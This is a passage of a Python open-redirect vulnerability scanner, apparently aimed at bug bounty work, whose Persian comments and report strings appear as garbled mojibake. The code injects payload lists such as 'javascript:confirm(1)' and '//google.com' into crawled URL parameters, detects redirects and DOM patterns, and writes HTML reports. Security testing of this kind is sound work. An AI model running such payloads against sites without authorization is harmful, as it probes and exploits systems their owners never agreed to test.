        value_lower = param_value.lower()
        
        # Check parameter name
        name_match = any(pattern in param_lower for pattern in self.redirect_patterns)
        
        # Check parameter value for URL patterns
        value_match = bool(re.match(r'https?://', value_lower) or 
                          re.match(r'//', value_lower) or
                          ('.' in value_lower and len(value_lower) > 3))
        
        return name_match or value_match
    
    def calculate_confidence(self, param_name: str, param_value: str, context: str) -> float:
        """ŸÖÿ≠ÿßÿ≥ÿ®Ÿá ÿßŸÖÿ™€åÿßÿ≤ ÿßÿπÿ™ŸÖÿßÿØ"""
        confidence = 0.0
        
        # Base confidence by context
        context_scores = {
            'query': 0.6, 'fragment': 0.7, 'form_input': 0.5,
            'javascript': 0.4, 'web3_config': 0.7
        }
        confidence += context_scores.get(context, 0.3)
        
        # Boost for redirect-related names
        if self.is_redirect_parameter(param_name):
            confidence += 0.3
        
        # Boost for URL-like values
        if param_value and (param_value.startswith(('http', '//', 'javascript:')) or 
                           '.' in param_value and len(param_value) > 5):
            confidence += 0.2
        
        return min(confidence, 1.0)
    
    def detect_context(self, param: Parameter) -> str:
        """ÿ™ÿ¥ÿÆ€åÿµ context Ÿæÿßÿ±ÿßŸÖÿ™ÿ±"""
        if param.source == 'web3':
            return 'web3'
        elif param.source == 'javascript':
            return 'javascript'
        elif param.context == 'fragment':
            return 'fragment'
        elif param.context == 'query':
            return 'query'
        elif param.context == 'form_input':
            return 'form'
        else:
            return 'generic'
    
    def get_context_payloads(self, context: str) -> List[str]:
        """ÿßŸÜÿ™ÿÆÿßÿ® payload ÿ®ÿ± ÿßÿ≥ÿßÿ≥ context"""
        if context == 'javascript':
            return [
                "javascript:confirm(1)",
                "javascript:prompt(1)",
                "//google.com",
                "https://google.com"
            ]
        elif context == 'web3':
            return [
                "//metamask.io",
                "//wallet.connect",
                "//uniswap.org",
                "web3://contract.eth",
                "//google.com"
            ]
        elif context == 'fragment':
            return [
                "//google.com",
                "https://google.com",
                "javascript:confirm(1)"
            ]
        else:
            # Default payloads for query, form, etc.
            return self.payloads[:20]  # First 20 payloads
    
    async def test_vulnerabilities(self) -> List[Vulnerability]:
        """ÿ™ÿ≥ÿ™ ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å‚ÄåŸáÿß"""
        self.logger.info("üéØ Starting vulnerability testing")
        
        vulnerabilities = []
        
        # Sort parameters by priority
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        high_conf_params = [p for p in self.parameters if p.confidence > 0.6]
        
        # Combine and deduplicate
        priority_params = list(set(redirect_params + high_conf_params))
        
        self.logger.info(f"Testing {len(priority_params)} priority parameters")
        
        for param in priority_params:
            context = self.detect_context(param)
            payloads = self.get_context_payloads(context)
            
            for payload in payloads:
                vuln = await self.test_parameter_with_payload(param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    self.logger.info(f"üö® Found vulnerability: {param.name} -> {payload}")
                
                await asyncio.sleep(0.1)  # Rate limiting
        
        # Test other parameters with limited payloads
        other_params = [p for p in self.parameters if p not in priority_params]
        basic_payloads = ["//google.com", "https://google.com", "javascript:confirm(1)"]
        
        for param in other_params[:30]:  # Limit to 30 other parameters
            for payload in basic_payloads:
                vuln = await self.test_parameter_with_payload(param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                
                await asyncio.sleep(0.1)
        
        self.vulnerabilities = vulnerabilities
        self.logger.info(f"Testing completed. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
    
    async def test_parameter_with_payload(self, param: Parameter, payload: str) -> Optional[Vulnerability]:
        """ÿ™ÿ≥ÿ™ Ÿæÿßÿ±ÿßŸÖÿ™ÿ± ÿ®ÿß payload"""
        try:
            # Construct test URL
            test_url = self.construct_test_url(param, payload)
            
            # Test with HTTP request
            async with self.session.get(test_url, allow_redirects=False) as response:
                # Check for redirect responses
                if response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    if self.is_successful_redirect(location, payload):
                        # Calculate metrics
                        confidence = param.confidence + 0.2
                        impact = self.assess_impact(location, payload)
                        remediation = self.suggest_remediation(param.context)
                        
                        # Take screenshot
                        screenshot_path = await self.take_screenshot(test_url)
                        
                        return Vulnerability(
                            url=test_url,
                            parameter=param.name,
                            payload=payload,
                            method=param.method,
                            response_code=response.status,
                            redirect_url=location,
                            context=param.context,
                            screenshot_path=screenshot_path,
                            timestamp=datetime.now().isoformat(),
                            vulnerability_type="open_redirect",
                            confidence=min(confidence, 1.0),
                            impact=impact,
                            remediation=remediation
                        )
                
                # Check for DOM-based redirects
                content = await response.text()
                dom_vuln = self.check_dom_based_redirect(content, test_url, param, payload)
                if dom_vuln:
                    return dom_vuln
                    
        except Exception as e:
            self.logger.debug(f"Error testing {param.name}: {e}")
        
        return None
    
    def construct_test_url(self, param: Parameter, payload: str) -> str:
        """ÿ≥ÿßÿÆÿ™ URL ÿ™ÿ≥ÿ™"""
        parsed = urlparse(param.url)
        
        if param.context == 'query':
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            query_params[param.name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        elif param.context == 'fragment':
            return f"{param.url.split('#')[0]}#{param.name}={quote(payload)}"
        
        else:
            separator = '&' if '?' in param.url else '?'
            return f"{param.url}{separator}{param.name}={quote(payload)}"
    
    def is_successful_redirect(self, location: str, payload: str) -> bool:
        """ÿ®ÿ±ÿ±ÿ≥€å ŸÖŸàŸÅŸÇ€åÿ™ redirect"""
        if not location:
            return False
        
        location_lower = location.lower()
        decoded_location = unquote(location).lower()
        
        # Check for test domains
        test_indicators = [
            'google.com', 'evil.com', 'example.com', 'metamask.io',
            'wallet.connect', 'uniswap.org', '216.58.214.206'
        ]
        
        for indicator in test_indicators:
            if indicator in location_lower or indicator in decoded_location:
                return True
        
        # Check for JavaScript execution
        if location_lower.startswith('javascript:') and ('confirm' in location_lower or 'prompt' in location_lower):
            return True
        
        return False
    
    def check_dom_based_redirect(self, content: str, test_url: str, param: Parameter, payload: str) -> Optional[Vulnerability]:
        """ÿ®ÿ±ÿ±ÿ≥€å DOM-based redirect"""
        # DOM redirect patterns
        dom_patterns = [
            r'location\.href\s*=\s*([^;]+)',
            r'window\.location\s*=\s*([^;]+)',
            r'document\.location\s*=\s*([^;]+)',
        ]
        
        for pattern in dom_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if param.name in match or payload in match:
                    return Vulnerability(
                        url=test_url,
                        parameter=param.name,
                        payload=payload,
                        method=param.method,
                        response_code=200,
                        redirect_url=match,
                        context=param.context,
                        timestamp=datetime.now().isoformat(),
                        vulnerability_type="dom_based_redirect",
                        confidence=0.8,
                        impact="HIGH",
                        remediation="Sanitize user input before DOM manipulation"
                    )
        
        return None
    
    def assess_impact(self, redirect_url: str, payload: str) -> str:
        """ÿßÿ±ÿ≤€åÿßÿ®€å ÿ™ÿ£ÿ´€åÿ± ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å"""
        if redirect_url.startswith('javascript:'):
            return "CRITICAL"
        elif redirect_url.startswith(('http://', 'https://')):
            redirect_domain = urlparse(redirect_url).netloc
            if redirect_domain != self.base_domain:
                return "HIGH"
        return "MEDIUM"
    
    def suggest_remediation(self, context: str) -> str:
        """Ÿæ€åÿ¥ŸÜŸáÿßÿØ ÿ±ŸÅÿπ ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å"""
        remediations = {
            'query': "Validate URL parameters against allowlist of permitted domains",
            'fragment': "Implement client-side validation for fragment parameters",
            'form_input': "Validate form inputs server-side before processing",
            'javascript': "Sanitize user input before JavaScript redirects",
            'web3_config': "Validate Web3 URLs against trusted provider list"
        }
        return remediations.get(context, "Implement proper input validation and use allowlist approach")
    
    async def take_screenshot(self, url: str) -> Optional[str]:
        """ÿπ⁄©ÿ≥‚Äåÿ®ÿ±ÿØÿßÿ±€å ÿ®ÿ±ÿß€å PoC"""
        if not self.driver or not SELENIUM_AVAILABLE:
            return None
        
        try:
            # Create screenshots directory
            screenshots_dir = Path("screenshots")
            screenshots_dir.mkdir(exist_ok=True)
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
            filename = f"poc_{timestamp}_{url_hash}.png"
            screenshot_path = screenshots_dir / filename
            
            # Take screenshot
            self.driver.get(url)
            await asyncio.sleep(2)
            self.driver.save_screenshot(str(screenshot_path))
            
            self.logger.info(f"üì∏ Screenshot saved: {screenshot_path}")
            return str(screenshot_path)
            
        except Exception as e:
            self.logger.error(f"Screenshot failed: {e}")
            return None
    
    def save_parameters(self, filename: str = "parameters.json"):
        """ÿ∞ÿÆ€åÿ±Ÿá ÿ™ŸÖÿßŸÖ Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß"""
        params_data = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'total_parameters': len(self.parameters),
                'redirect_parameters': len([p for p in self.parameters if p.is_redirect_related]),
                'vulnerabilities_found': len(self.vulnerabilities)
            },
            'parameters': [asdict(param) for param in self.parameters],
            'vulnerabilities': [asdict(vuln) for vuln in self.vulnerabilities]
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(params_data, f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"üíæ Parameters saved to {filename}")
        
        # Save CSV for analysis
        self.save_parameters_csv()
    
    def save_parameters_csv(self):
        """ÿ∞ÿÆ€åÿ±Ÿá Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß ÿØÿ± ŸÅÿ±ŸÖÿ™ CSV"""
        csv_filename = "parameters_analysis.csv"
        
        with open(csv_filename, 'w', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['name', 'value', 'source', 'context', 'url', 'is_redirect_related', 'confidence', 'vulnerability_found']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            
            vuln_params = {v.parameter for v in self.vulnerabilities}
            
            for param in self.parameters:
                writer.writerow({
                    'name': param.name,
                    'value': param.value[:100],
                    'source': param.source,
                    'context': param.context,
                    'url': param.url,
                    'is_redirect_related': param.is_redirect_related,
                    'confidence': param.confidence,
                    'vulnerability_found': param.name in vuln_params
                })
        
        self.logger.info(f"üìä CSV analysis saved to {csv_filename}")
    
    def generate_html_report(self, output_file: str = "open_redirect_report.html"):
        """ÿ™ŸàŸÑ€åÿØ ⁄Øÿ≤ÿßÿ±ÿ¥ HTML ÿ≠ÿ±ŸÅŸá‚Äåÿß€å"""
        
        # Calculate statistics
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        high_conf_params = [p for p in self.parameters if p.confidence > 0.7]
        
        # Group vulnerabilities by impact
        impact_counts = {}
        for vuln in self.vulnerabilities:
            impact_counts[vuln.impact] = impact_counts.get(vuln.impact, 0) + 1
        
        html_content = f"""
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⁄Øÿ≤ÿßÿ±ÿ¥ ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å Open Redirect</title>
    <style>
        body {{ font-family: 'Tahoma', 'Arial', sans-serif; margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #d32f2f 0%, #f44336 100%); color: white; padding: 30px; text-align: center; }}
        .header h1 {{ margin: 0; font-size: 2.5em; }}
        .content {{ padding: 30px; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .summary-card {{ background: #f8f9fa; border-radius: 8px; padding: 20px; text-align: center; border-right: 4px solid #2196f3; }}
        .summary-card h3 {{ margin: 0 0 10px 0; color: #333; }}
        .summary-card .number {{ font-size: 2em; font-weight: bold; color: #2196f3; }}
        .vulnerability {{ background: #ffebee; border-radius: 8px; padding: 20px; margin-bottom: 20px; border-right: 6px solid #f44336; }}
        .vulnerability.critical {{ border-right-color: #d32f2f; background: #fce4ec; }}
        .vulnerability.high {{ border-right-color: #f44336; }}
        .vulnerability.medium {{ border-right-color: #ff9800; background: #fff3e0; }}
        .parameter {{ background: #f3e5f5; border-radius: 6px; padding: 15px; margin-bottom: 15px; border-right: 4px solid #9c27b0; }}
        .parameter.redirect {{ border-right-color: #f44336; background: #ffebee; }}
        .code {{ background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 6px; font-family: monospace; overflow-x: auto; }}
        .success {{ color: #4caf50; font-weight: bold; }}
        .warning {{ color: #ff9800; font-weight: bold; }}
        .error {{ color: #f44336; font-weight: bold; }}
        .critical {{ color: #d32f2f; font-weight: bold; }}
        .screenshot {{ max-width: 100%; border-radius: 8px; margin: 10px 0; }}
        .metadata {{ font-size: 0.9em; color: #666; margin-top: 10px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîç ⁄Øÿ≤ÿßÿ±ÿ¥ ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å Open Redirect</h1>
            <p>ÿßÿ≥⁄©ŸÜÿ± ÿ≠ÿ±ŸÅŸá‚Äåÿß€å ÿßŸÖŸÜ€åÿ™ Ÿàÿ®</p>
        </div>
        
        <div class="content">
            <div class="summary">
                <div class="summary-card">
                    <h3>ŸáÿØŸÅ</h3>
                    <div class="number">{self.base_domain}</div>
                </div>
                <div class="summary-card">
                    <h3>URL Ÿáÿß€å ÿÆÿ≤ÿ¥ ÿ¥ÿØŸá</h3>
                    <div class="number">{len(self.discovered_urls)}</div>
                </div>
                <div class="summary-card">
                    <h3>Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß€å ⁄©ÿ¥ŸÅ ÿ¥ÿØŸá</h3>
                    <div class="number">{len(self.parameters)}</div>
                </div>
                <div class="summary-card">
                    <h3>Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß€å Redirect</h3>
                    <div class="number">{len(redirect_params)}</div>
                </div>
                <div class="summary-card">
                    <h3>ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å‚ÄåŸáÿß</h3>
                    <div class="number {'error' if len(self.vulnerabilities) > 0 else 'success'}">{len(self.vulnerabilities)}</div>
                </div>
                <div class="summary-card">
                    <h3>ŸÅÿß€åŸÑ‚ÄåŸáÿß€å JS</h3>
                    <div class="number">{len(self.js_files)}</div>
                </div>
            </div>
"""
        
        # Add vulnerabilities section
        if self.vulnerabilities:
            html_content += """
            <h2>üö® ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å‚ÄåŸáÿß€å ⁄©ÿ¥ŸÅ ÿ¥ÿØŸá</h2>
"""
            for i, vuln in enumerate(self.vulnerabilities, 1):
                html_content += f"""
            <div class="vulnerability {vuln.impact.lower()}">
                <h3>ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å #{i}: {vuln.vulnerability_type}</h3>
                <p><strong>URL:</strong> <code>{vuln.url}</code></p>
                <p><strong>Ÿæÿßÿ±ÿßŸÖÿ™ÿ±:</strong> <code>{vuln.parameter}</code></p>
                <p><strong>Payload:</strong></p>
                <div class="code">{vuln.payload}</div>
                <p><strong>Response Code:</strong> {vuln.response_code}</p>
                <p><strong>Redirect URL:</strong> <code>{vuln.redirect_url}</code></p>
                <p><strong>ÿ™ÿ£ÿ´€åÿ±:</strong> <span class="{vuln.impact.lower()}">{vuln.impact}</span></p>
                <p><strong>ÿßÿπÿ™ŸÖÿßÿØ:</strong> {vuln.confidence:.1%}</p>
                <p><strong>ÿ±ÿßŸá ÿ≠ŸÑ:</strong> {vuln.remediation}</p>
"""
                if vuln.screenshot_path:
                    html_content += f"""
                <div>
                    <h4>üì∏ ÿπ⁄©ÿ≥ ÿßÿ´ÿ®ÿßÿ™ ŸÖŸÅŸáŸàŸÖ:</h4>
                    <img src="{vuln.screenshot_path}" alt="PoC Screenshot" class="screenshot">
                </div>
"""
                html_content += f"""
                <div class="metadata">ÿ≤ŸÖÿßŸÜ: {vuln.timestamp} | Context: {vuln.context}</div>
            </div>
"""
        else:
            html_content += """
            <div style="text-align: center; padding: 40px; background: #e8f5e8; border-radius: 8px;">
                <h2 class="success">‚úÖ Ÿá€å⁄Ü ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å Open Redirect €åÿßŸÅÿ™ ŸÜÿ¥ÿØ</h2>
                <p>ÿ®ÿ±ŸÜÿßŸÖŸá ŸáÿØŸÅ ÿ®Ÿá ÿØÿ±ÿ≥ÿ™€å ÿØÿ± ÿ®ÿ±ÿßÿ®ÿ± ÿ≠ŸÖŸÑÿßÿ™ Open Redirect ŸÖÿ≠ÿßŸÅÿ∏ÿ™ ÿ¥ÿØŸá ÿßÿ≥ÿ™.</p>
            </div>
"""
        
        # Add parameters section
        html_content += f"""
            <h2>üîç Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß€å ⁄©ÿ¥ŸÅ ÿ¥ÿØŸá</h2>
            <p><strong>ŸÖÿ¨ŸÖŸàÿπ Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß:</strong> {len(self.parameters)}</p>
            <p><strong>ŸÖÿ±ÿ™ÿ®ÿ∑ ÿ®ÿß Redirect:</strong> {len(redirect_params)}</p>
            <p><strong>ÿßÿπÿ™ŸÖÿßÿØ ÿ®ÿßŸÑÿß:</strong> {len(high_conf_params)}</p>
            
            <h3>üéØ Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß€å ÿßŸàŸÑŸà€åÿ™ ÿ®ÿßŸÑÿß</h3>
"""
        
        priority_params = redirect_params + high_conf_params
        for param in priority_params[:10]:  # Show first 10
            redirect_class = "redirect" if param.is_redirect_related else ""
            html_content += f"""
            <div class="parameter {redirect_class}">
                <h4>{param.name} {'(ŸÖÿ±ÿ™ÿ®ÿ∑ ÿ®ÿß Redirect)' if param.is_redirect_related else ''}</h4>
                <p><strong>ŸÖŸÇÿØÿßÿ±:</strong> <code>{param.value[:100]}{'...' if len(param.value) > 100 else ''}</code></p>
                <p><strong>ŸÖŸÜÿ®ÿπ:</strong> {param.source} | <strong>Context:</strong> {param.context}</p>
                <p><strong>URL:</strong> <code>{param.url}</code></p>
                <p><strong>ÿßÿπÿ™ŸÖÿßÿØ:</strong> {param.confidence:.1%}</p>
            </div>
"""
        
        html_content += f"""
            <div class="metadata" style="text-align: center; margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd;">
                <p><strong>⁄Øÿ≤ÿßÿ±ÿ¥ ÿ™ŸàŸÑ€åÿØ ÿ¥ÿØŸá ÿ™Ÿàÿ≥ÿ∑ ÿßÿ≥⁄©ŸÜÿ± ÿ≠ÿ±ŸÅŸá‚Äåÿß€å Open Redirect v2.0</strong></p>
                <p>ÿ™ÿßÿ±€åÿÆ ÿßÿ≥⁄©ŸÜ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
        </div>
    </div>
</body>
</html>
"""
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        self.logger.info(f"üìÑ HTML report generated: {output_file}")
    
    async def run_complete_scan(self):
        """ÿßÿ¨ÿ±ÿß€å ÿßÿ≥⁄©ŸÜ ⁄©ÿßŸÖŸÑ"""
        start_time = time.time()
        self.logger.info("üöÄ Starting Professional Open Redirect Scanner")
        
        try:
            # ÿ±ÿßŸá‚ÄåÿßŸÜÿØÿßÿ≤€å
            await self.init_session()
            self.init_driver()
            
            # ŸÖÿ±ÿ≠ŸÑŸá 1: ÿÆÿ≤ÿ¥ ÿπŸÖ€åŸÇ
            self.logger.info("ŸÖÿ±ÿ≠ŸÑŸá 1: ÿÆÿ≤ÿ¥ ÿπŸÖ€åŸÇ Ÿà ÿßÿ≥ÿ™ÿÆÿ±ÿßÿ¨ Ÿæÿßÿ±ÿßŸÖÿ™ÿ±")
            await self.crawl_website()
            
            # ŸÖÿ±ÿ≠ŸÑŸá 2: ÿ™ÿ≠ŸÑ€åŸÑ Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß
            self.logger.info("ŸÖÿ±ÿ≠ŸÑŸá 2: ÿ™ÿ≠ŸÑ€åŸÑ Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß€å redirect")
            redirect_params = [p for p in self.parameters if p.is_redirect_related]
            
            # ŸÖÿ±ÿ≠ŸÑŸá 3: ÿ™ÿ≥ÿ™ ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å
            self.logger.info("ŸÖÿ±ÿ≠ŸÑŸá 3: ÿ™ÿ≥ÿ™ ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å‚ÄåŸáÿß€å Open Redirect")
            await self.test_vulnerabilities()
            
            # ŸÖÿ±ÿ≠ŸÑŸá 4: ÿ∞ÿÆ€åÿ±Ÿá ŸÜÿ™ÿß€åÿ¨
            self.logger.info("ŸÖÿ±ÿ≠ŸÑŸá 4: ÿ™ŸàŸÑ€åÿØ ⁄Øÿ≤ÿßÿ±ÿ¥‚ÄåŸáÿß")
            self.save_parameters()
            self.generate_html_report()
            
            # ÿÆŸÑÿßÿµŸá ŸÜŸáÿß€å€å
            scan_duration = time.time() - start_time
            self.logger.info("üéØ ÿÆŸÑÿßÿµŸá ÿßÿ≥⁄©ŸÜ:")
            self.logger.info(f"   ŸÖÿØÿ™ ÿ≤ŸÖÿßŸÜ: {scan_duration:.2f} ÿ´ÿßŸÜ€åŸá")
            self.logger.info(f"   URL Ÿáÿß€å ÿÆÿ≤ÿ¥ ÿ¥ÿØŸá: {len(self.discovered_urls)}")
            self.logger.info(f"   Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß€å ⁄©ÿ¥ŸÅ ÿ¥ÿØŸá: {len(self.parameters)}")
            self.logger.info(f"   Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß€å Redirect: {len(redirect_params)}")
            self.logger.info(f"   ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å‚ÄåŸáÿß€å €åÿßŸÅÿ™ ÿ¥ÿØŸá: {len(self.vulnerabilities)}")
            
            if self.vulnerabilities:
                self.logger.info("üö® ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å‚ÄåŸáÿß:")
                for vuln in self.vulnerabilities:
                    self.logger.info(f"   ‚Ä¢ {vuln.parameter} -> {vuln.payload} ({vuln.impact})")
            else:
                self.logger.info("‚úÖ Ÿá€å⁄Ü ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å €åÿßŸÅÿ™ ŸÜÿ¥ÿØ")
            
            print("\n" + "="*60)
            print("üéâ ÿßÿ≥⁄©ŸÜ ÿ®ÿß ŸÖŸàŸÅŸÇ€åÿ™ ÿ™⁄©ŸÖ€åŸÑ ÿ¥ÿØ!")
            print(f"üìÑ ⁄Øÿ≤ÿßÿ±ÿ¥ HTML: open_redirect_report.html")
            print(f"üíæ ÿØÿßÿØŸá‚ÄåŸáÿß€å JSON: parameters.json") 
            print(f"üìä ÿ™ÿ≠ŸÑ€åŸÑ CSV: parameters_analysis.csv")
            if self.vulnerabilities and SELENIUM_AVAILABLE:
                print(f"üì∏ ÿπ⁄©ÿ≥‚ÄåŸáÿß€å PoC: screenshots/")
            print("="*60)
            
        except Exception as e:
            self.logger.error(f"Scan failed: {e}")
            raise
        finally:
            if self.session:
                await self.session.close()
            if self.driver:
                self.driver.quit()


def print_banner():
    """ŸÜŸÖÿß€åÿ¥ banner ÿ≠ÿ±ŸÅŸá‚Äåÿß€å"""
    banner = """
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                                       ‚ïë
‚ïë    üîç Professional Open Redirect Vulnerability Scanner üîç             ‚ïë
‚ïë                                                                       ‚ïë
‚ïë    ‚ú® Ÿà€å⁄ò⁄Ø€å‚ÄåŸáÿß:                                                      ‚ïë
‚ïë    ‚Ä¢ ÿÆÿ≤ÿ¥ ÿπŸÖ€åŸÇ ÿ®ÿß ÿ±ŸÜÿØÿ± JavaScript                                     ‚ïë
‚ïë    ‚Ä¢ ÿ™ÿ≠ŸÑ€åŸÑ Ÿæ€åÿ¥ÿ±ŸÅÿ™Ÿá ŸÅÿß€åŸÑ‚ÄåŸáÿß€å JS                                       ‚ïë
‚ïë    ‚Ä¢ ÿ™ÿ¥ÿÆ€åÿµ DOM-based vulnerability                                   ‚ïë
‚ïë    ‚Ä¢ Ÿæÿ¥ÿ™€åÿ®ÿßŸÜ€å Web3 Ÿà Blockchain                                     ‚ïë
‚ïë    ‚Ä¢ ÿ™ÿ≤ÿ±€åŸÇ payload ŸáŸàÿ¥ŸÖŸÜÿØ ÿ®ÿ± ÿßÿ≥ÿßÿ≥ context                           ‚ïë
‚ïë    ‚Ä¢ ÿπ⁄©ÿ≥‚Äåÿ®ÿ±ÿØÿßÿ±€å ÿÆŸàÿØ⁄©ÿßÿ± PoC                                           ‚ïë
‚ïë    ‚Ä¢ ⁄Øÿ≤ÿßÿ±ÿ¥‚ÄåÿØŸá€å ÿ≠ÿ±ŸÅŸá‚Äåÿß€å                                               ‚ïë
‚ïë                                                                       ‚ïë
‚ïë    üéØ ÿ∑ÿ±ÿßÿ≠€å ÿ¥ÿØŸá ÿ®ÿ±ÿß€å Bug Bounty Hunter Ÿáÿß                           ‚ïë
‚ïë                                                                       ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
"""
    print(banner)


def show_usage():
    """ŸÜŸÖÿß€åÿ¥ ÿ±ÿßŸáŸÜŸÖÿß€å ÿßÿ≥ÿ™ŸÅÿßÿØŸá"""
    print("üìñ ŸÜÿ≠ŸàŸá ÿßÿ≥ÿ™ŸÅÿßÿØŸá:")
    print("="*50)
    print("# ÿßÿ≥⁄©ŸÜ ÿ≥ÿßÿØŸá:")
    print("python3 open_redirect_pro.py https://target.com")
    print("")
    print("# ÿßÿ≥⁄©ŸÜ Ÿæ€åÿ¥ÿ±ŸÅÿ™Ÿá:")
    print("python3 open_redirect_pro.py https://target.com --depth 4 --max-pages 300 --verbose")
    print("")
    print("# ŸÜŸÖÿß€åÿ¥ ÿ±ÿßŸáŸÜŸÖÿß:")
    print("python3 open_redirect_pro.py --help")
    print("")


def check_dependencies():
    """ÿ®ÿ±ÿ±ÿ≥€å Ÿàÿßÿ®ÿ≥ÿ™⁄Ø€å‚ÄåŸáÿß"""
    print("üîç ÿ®ÿ±ÿ±ÿ≥€å Ÿàÿßÿ®ÿ≥ÿ™⁄Ø€å‚ÄåŸáÿß...")
    
    missing_deps = []
    
    # Check aiohttp
    try:
        import aiohttp
        print("‚úÖ aiohttp")
    except ImportError:
        missing_deps.append("aiohttp")
        print("‚ùå aiohttp")
    
    # Check optional dependencies
    if not SELENIUM_AVAILABLE:
        print("‚ö†Ô∏è  selenium (ÿπ⁄©ÿ≥‚Äåÿ®ÿ±ÿØÿßÿ±€å ÿ∫€åÿ±ŸÅÿπÿßŸÑ)")
    else:
        print("‚úÖ selenium")
    
    if not BS4_AVAILABLE:
        print("‚ö†Ô∏è  beautifulsoup4 (ÿ™ÿ≠ŸÑ€åŸÑ HTML ÿ≥ÿßÿØŸá)")
    else:
        print("‚úÖ beautifulsoup4")
    
    if not JS_ANALYSIS_AVAILABLE:
        print("‚ö†Ô∏è  esprima/jsbeautifier (ÿ™ÿ≠ŸÑ€åŸÑ JS ÿ®ÿß regex)")
    else:
        print("‚úÖ esprima & jsbeautifier")
    
    if missing_deps:
        print(f"\nüì¶ ÿ®ÿ±ÿß€å ŸÜÿµÿ® Ÿàÿßÿ®ÿ≥ÿ™⁄Ø€å‚ÄåŸáÿß€å ŸÑÿßÿ≤ŸÖ:")
        print(f"pip3 install {' '.join(missing_deps)}")
        print("pip3 install selenium beautifulsoup4 esprima jsbeautifier")
    
    return len(missing_deps) == 0


async def main():
    """ÿ™ÿßÿ®ÿπ ÿßÿµŸÑ€å"""
    print_banner()
    
